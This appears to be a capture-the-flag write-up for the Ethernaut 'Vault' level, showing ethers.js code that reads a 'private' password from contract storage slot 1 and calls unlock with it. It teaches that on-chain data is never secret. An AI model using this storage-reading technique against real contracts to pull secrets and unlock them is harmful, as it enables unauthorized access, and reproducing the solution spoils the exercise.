We are given a contract that has a `locked` boolean property. Initially it is set to true and our objective is to toggle it to false. The only way of doing so is by calling the `unlock` function passing the right password.

The contract was deployed and initialized with the `password` variable being `private`. Although password state variable is private, one can still read a storage variable by determining it's storage slot.

Learning: sensitive information should not be stored on-chain, even if it is specified private.

### Solution 

1. Load level contract deployed for us by Ethernaut using ABI and address:
```
const level_instance_address = "0xA8EEe4D1bAfC6e22e1d22B585999C5a85cBBb186" // ethernaut's deployed contract
var jsonFile = "artifacts/solutions/level8-vault/vault.sol/Vault.json"; // hardhat compiles first
var parsed = JSON.parse(fs.readFileSync(jsonFile));
var contractABI = parsed.abi;
const contract = new ethers.Contract(level_instance_address, contractABI, provider);
```

2. Get storage and decode `password`:
```
const data_ = await provider.getStorageAt(level_instance_address, 1);
console.log(data_);
password = hex_to_ascii(data_).slice(1,);
console.log(chalk.red("Password is:", password));
```

3. Call unlock function of the contract with the correct encoded `password`:
```
const signer = contract.connect(provider.getSigner());
await signer.unlock(ethers.utils.hexlify(ethers.utils.toUtf8Bytes(password)));
```